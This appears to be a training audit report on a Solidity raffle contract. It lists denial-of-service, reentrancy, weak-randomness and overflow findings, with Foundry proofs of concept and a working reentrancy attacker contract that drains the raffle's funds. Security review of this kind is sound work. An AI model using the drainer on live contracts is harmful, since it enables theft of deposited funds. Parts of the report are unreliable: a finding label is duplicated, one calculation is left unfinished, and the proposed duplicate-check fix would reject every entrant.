## [M-1] TITLE Looping through the playesr array for duplicate, `PuppyRaffle::enterRaffle` is a potential Denial of Service attack (DoS). It increments gas cost for further entrants.

**Description** the `PuppyRaffle::enterRaffle` loops through the `players array` to check for duplicates. However the longer the `PuppyRaffle::players` array is, the more new checks the player has to make. This means players that plays earlier gas cost would be drammatically lower than those that play later. every additional `player` in the array means for checks which mean additional gas cost.

```javascripts
for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
        }
        for (uint256 i = 0; i < players.length - 1; i++) {
            for (uint256 j = i + 1; j < players.length; j++) {
                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
            }
        }

```

**Impact** The gas cost for further entrants would keep on increasing discouraging further entrants for playing the game. This can cause players to make rush to be the first to play. 

An attacker might make the `Puppyraffle:entrants` bigger so no one plays, therefore making them the sole winner.

**Proof of Concepts** For the two sets of 100 players each that entered the game show this gas prices

- Gas cost for the first 100 players:  6252047
- Gas cost for the second 100 players:  18068137

The gas cost for the second 100 players is 3X more than the gas cost of the first 100 players

<details>
<summary>PoC</summary>

Place the following into `PuppyRaffleTest.t.sol`

```javascripts

    function test_denialOfService() public {

        vm.txGasPrice(1);
        uint256 numPlayers = 100;

        // Enter 100 players
        address[] memory players = new address[](numPlayers);
        for (uint256 i = 0; i < numPlayers; i++) {
            players[i] = address(i);
        }
        uint256 gasStart = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(players);
        uint256 gasEnd = gasleft();
        uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
        console.log('Gas cost for the first 100 players: ', gasUsedFirst);
        
        // For 2nd 100 players
         address[] memory playersTwo = new address[](numPlayers);
        for (uint256 i = 0; i < numPlayers; i++) {
            playersTwo[i] = address(i + numPlayers); // 0,1,2 --> 100, 101, 102
        }
        uint256 gasStartSecond = gasleft();
        puppyRaffle.enterRaffle{value: entranceFee * numPlayers}(playersTwo);
        uint256 gasEndSecond = gasleft();
        uint256 gasUsedSecond = (gasStartSecond - gasEndSecond) * tx.gasprice;
         console.log('Gas cost for the first 100 players: ', gasUsedSecond);

         assert(gasUsedFirst < gasUsedSecond);

    }

```
</details>


**Recommended mitigation** There are few recommendations 

1. Consider allowing for duplicates
2. Consider using a mapping to check for duplicates

<details>

<summary>Recommendation</summary>

```diff
mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
    .
    .
    .
    function enterRaffle(address[] memory newPlayers) public payable {
        require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
        for (uint256 i = 0; i < newPlayers.length; i++) {
            players.push(newPlayers[i]);
+            addressToRaffleId[newPlayers[i]] = raffleId;
        }

-        // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
        emit RaffleEnter(newPlayers);
    }
.
.
.
    function selectWinner() external {
+       raffleId = raffleId + 1;
        require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
    }

```
</details>

- Alternatively, you could use OpenZeppelin's EnumerableSet library.


## [I-2] Solidity version should be specific not wide. 
solc frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex pragma statement. Recommendation.

**Recommendations:**

Deploy with any of the following Solidity versions:

    `0.8.18`

The recommendations take into account:

    Risks related to recent releases
    Risks of complex code generation changes
    Risks of new language features
    Risks of known bugs

Use a simple pragma version that allows any of these versions. Consider using the latest version of Solidity for testing.

### Low

## [L-1] `PuppyRaffle::getActivePlayerIndex` This returns 0 for in-active players and also player in index 0. This make player in index 0 think he has not entered the raffle.

**Description** If a playe is in the `PuppyRaffle::players` array at index 0, this would return 0 but according to the natspec it would also return 0 for player not in the array.

```javascripts
function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
    }

```
**Impact** This make player in index 0 think he has not entered the raffle, and may want to enter the raffle again thereby wasting gas. 

**Proof of Concept** 
1. User enters the raffle, they are the first entrant
2. `PuppyRaffle::getActivePlayerIndex` returns 0
3. User thinks they have not entered correctly due to the function documentation

**Recommendations:** The easiest recommendation would be to revert if the player is not in the array instead of returning 0.
You could also reserve the 0th position for any competition, but an even better solution might be to return an `int256` where the function returns -1 if the player is not active.

### Gas

## [G-1] Unchanged state variables should be declared constant or immutable

Reading from storage is much more expensive than reading a constant or immutable variable.

Instances:

- `PuppyRaffle::raffleDuration` should be `immutable`
- `PuppyRaffle::commonImageUri` should be `constant`
- `PuppyRaffle::rareImageUri` should be `constant`
- `PuppyRaffle::legendaryImageUri` should be `constant`


## [I-3] Missing checks for address(0) when assigning values to address state variables
Assigning values to address state variables without checking for address(0).

```solidity
feeAddress = _feeAddress;
```

```solidity
previousWinner = winner;
```

```solidity
feeAddress = newFeeAddress;
```

## [G-2] Storage Variables in a Loop Should be Cached
Everytime you call players.length you read from storage, as opposed to memory which is more gas efficient.

```diff

+ uint256 playersLength = players.length;
- for (uint256 i = 0; i < players.length - 1; i++) {
+ for (uint256 i = 0; i < playersLength - 1; i++) {
-    for (uint256 j = i + 1; j < players.length; j++) {
+    for (uint256 j = i + 1; j < playersLength; j++) {
      require(players[i] != players[j], "PuppyRaffle: Duplicate player");
+ }
- }
+ }
- }

```

## [H-1] Reentrancy attack in `PuppyRaffle::refund` allows participants to drain raffle balance

**Description** The `PuppyRaffle::refund` doesnt follo the CEI --> Checks-Effects-Interactions. As a result enables the participants to drain the contract balance

```javascripts
     function refund(uint256 playerIndex) public {
    
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
        
@>        payable(msg.sender).sendValue(entranceFee);
@>        players[playerIndex] = address(0);

        emit RaffleRefunded(playerAddress);
    }
```
A player who has entered the raffle could has a fallback/receive function can call `PuppyRaffle::refund` function again to drain the protocol. The malicious player can drain the protocol repeat this cycle this he drains the protocol.

**Impact** All fees paid by the playesr can be drained by the malicious attacker

**Proof of Concept** 

1. User enters the raffle
2. Attacker sets a contract with a fallbackback function to attack the `PuppyRaffle` protocol.
3. Attacker enters the raffle
4. The attacker calls the `PuppyRaffle::refund` from their contract thereby draining the PuppyRaffle protocol

**Proof of Code**

<details>
<summary>Code</summary>

Run this code in the `PuppyRaffle.t.sol` test file

```javascripts

function testReentrancyRefund() public {
        address[] memory players = new address[](4);
        players[0] = playerOne;
        players[1] = playerTwo;
        players[2] = playerThree;
        players[3] = playerFour;

        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

       ReentrancyAttacker attackerContract =  new ReentrancyAttacker(puppyRaffle);
       address attackerUser = makeAddr("attackerUser");
       vm.deal(attackerUser, 1 ether);

       uint256 startingAttackerContractBalance = address(attackerContract).balance;
       uint256 startingContractBalance = address(puppyRaffle).balance;

       // attack
       vm.prank(attackerUser);
       attackerContract.attack{value:entranceFee}();

       console.log("Starting attack contract balance: ", startingAttackerContractBalance);
       console.log("Starting contract balance: ", startingContractBalance);

       console.log("Attacker contract balance: ", address(attackerContract).balance);
       console.log("Contract balance: ", address(puppyRaffle).balance);
    }

```
This contract as well

```javascripts

contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _stealMoney();
    }

    receive() external payable {
        _stealMoney();
    }

}


```
</details>

**Recommended Mitigation** To prevent this we should have the `PuppyRaffle::refund` function update the state before making an external call. 

```diff

function refund(uint256 playerIndex) public {
address playerAddress = players[playerIndex];
require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+ players[playerIndex] = address(0);
+ emit RaffleRefunded(playerAddress);
payable(msg.sender).sendValue(entranceFee);
- players[playerIndex] = address(0);
- emit RaffleRefunded(playerAddress);
}

```
## [I-4] `PuppyRaffle::selectWinner` Its advicable to follow Check-Effects-Interaction (CEI) guildline. 

```diff

-(bool success,) = winner.call{value: prizePool}("");
-require(success, "PuppyRaffle: Failed to send prize pool to winner");
 _safeMint(winner, tokenId);
+(bool success,) = winner.call{value: prizePool}("");
+require(success, "PuppyRaffle: Failed to send prize pool to winner");

```

## [H-1] Weak Randomness `PuppyRaffle::selectWinner` allows users to infulence or predict winners of the rarest puppy. 

**Description** Hashing `msg.sender`, `block.timestamp`, and `block.difficulty` together creates a predictable find number. A predictable number is not a good random number. Malicious users can manupulate these values or know them ahead of time to choose them ahead of time to choose the winner.

*Note* Users can frontrun this function in the protocol and call `refund` if the see that the are not the winner.

**Impact** User can influence the winner in the protocol, getting the rarest puppy. This becomes a gas war about who wins the rarest puppy.

**Proof of Concept** 

1. Validators can know ahead of time `block.timestamp` and `block.difficulty` and use it to predict when and how to participate to his/her advantage.
2. Users can manipulate/mine their `msg.sender` value to result in their address being used to generate the winner.
3. User can revert their `selectWinner` transaction if they like the winner or resulting puppy.

Using on-chain values as a randomness seed is a [well-documented attack vector](https://betterprogramming.pub/how-to-generate-truly-random-numbers-in-solidity-and-blockchain-9ced6472dbdf) in the blockchain space.

**Recommended Mitigation:** Consider using a cryptographically provable random number generator such as [Chainlink VRF](https://docs.chain.link/vrf)

### [I-5] Use of magic numbers is discouraged. It can be confusing to see literals in code base, and its much more readable if the numbers are give a name.

Examples

```js
uint256 public constant PRIZE_POOL_PERCENTAGE = 80;
uint256 public constant FEE_PERCENTAGE = 20;
uint256 public constant POOL_PRECISION = 100;

uint256 prizePool = (totalAmountCollected * PRIZE_POOL_PERCENTAGE) / POOL_PRECISION;
uint256 fee = (totalAmountCollected * FEE_PERCENTAGE) / POOL_PRECISION;
```


## [M-3] Smart Contract Wallet of raffle winners without a `receive` or `fallback` function will block the start og a new contest. 

**Description** The `PuppyRaffle::selectWinner` function is responsible for resetting the lottery, however if the winner is a smart contract wallet rejects payments, the lottery would not be able to restart. Non-smart contract wallet users could reenter, but it might cost them a lot of gas due to the duplicate check.

**Impact:** The `PuppyRaffle::selectWinner` function could revert many times, and make it very difficult to reset the lottery, preventing a new one from starting.

Also, true winners would not be able to get paid out, and someone else would win their money!

**Proof of Concept:**
1. 10 smart contract wallets enter the lottery without a fallback or receive function.
2. The lottery ends
3. The `selectWinner` function wouldn't work, even though the lottery is over!


**Recommended Mitigation:** There are a few options to mitigate this issue.

1. Do not allow smart contract wallet entrants (not recommended)
2. Create a mapping of addresses -> payout so winners can pull their funds out themselves, putting the owness on the winner to claim their prize. (Recommended)


## [H-3] Integer overflow of `PuppyRaffle::totalFees` causes loses fees

**Description** Solidity versions prior to `0.8.0` integers are subjected to integre overflows

```js
uint64 myVar = type(uint64).max
// 18446744073709551615

uint64 myVar = uintmyVar + 1
// myVar Will return 0

```

**Impact** In `PuppyRaffle::selectWinner` , `totalfees` are accumulated for the `feeAddress` to collect later `PuppyRaffle::withdrawFees`. However, if the `totalFees` variables overflows, the fee `feeAddress` may not collect the correct amount of fees, leaving fees permanently stuck in the contract.

**Proof of Code**

1. When we conclude the raffle of 4 players
2. We then have 89 players enter a new raffle, and conclude the raffle
3. `totalFees` will be :

```javascript
    totalFees = totalFees + uint64(fee)
    // akak
    totalFees = 
```
4. You will not be able to withdraw, due to the line in `PuppyRaffle::withdrawFees

```diff
- require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");
```

**Recommended Mitigation**
There are a few possible mitigations

1. User a newer version of solidity
2. Remove balance check of `PuppyRaffle::withdrawFees`

```diff
- require(address(this).balance == uint256(totalFees), "PuppyRaffle: There are currently players active!");   
```
There are more attack vectors with that final require, so we can recommend removing it regardless


<details>
<summary>Code</summary>

```javascripts
function testTotalFeesOverflow() public playersEntered {
        // We finish a raffle of 4 to collect some fees
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);
        puppyRaffle.selectWinner();
        uint256 startingTotalFees = puppyRaffle.totalFees();
        // startingTotalFees = 800000000000000000

        // We then have 89 players enter a new raffle
        uint256 playersNum = 89;
        address[] memory players = new address[](playersNum);
        for (uint256 i = 0; i < playersNum; i++) {
            players[i] = address(i);
        }
        puppyRaffle.enterRaffle{value: entranceFee * playersNum}(players);
        // We end the raffle
        vm.warp(block.timestamp + duration + 1);
        vm.roll(block.number + 1);

        // And here is where the issue occurs
        // We will now have fewer fees even though we just finished a second raffle
        puppyRaffle.selectWinner();

        uint256 endingTotalFees = puppyRaffle.totalFees();
        console.log("ending total fees", endingTotalFees);
        assert(endingTotalFees < startingTotalFees);

        // We are also unable to withdraw any fees because of the require check
        vm.prank(puppyRaffle.feeAddress());
        vm.expectRevert("PuppyRaffle: There are currently players active!");
        puppyRaffle.withdrawFees();
    }
```
</details>

### [I-6] State Changes are Missing Events

A lack of emitted events can often lead to difficulty of external or front-end systems to accurately track changes within a protocol.

It is best practice to emit an event whenever an action results in a state change.

Examples:
- `PuppyRaffle::totalFees` within the `selectWinner` function
- `PuppyRaffle::raffleStartTime` within the `selectWinner` function
- `PuppyRaffle::totalFees` within the `withdrawFees` function


### [I-7] isActivePlayer is never used and should be removed

**Description** The function PuppyRaffle::isActivePlayer is never used and should be removed.

```diff
-    function _isActivePlayer() internal view returns (bool) {
-        for (uint256 i = 0; i < players.length; i++) {
-            if (players[i] == msg.sender) {
-                return true;
-            }
-        }
-        return false;
-    }
```







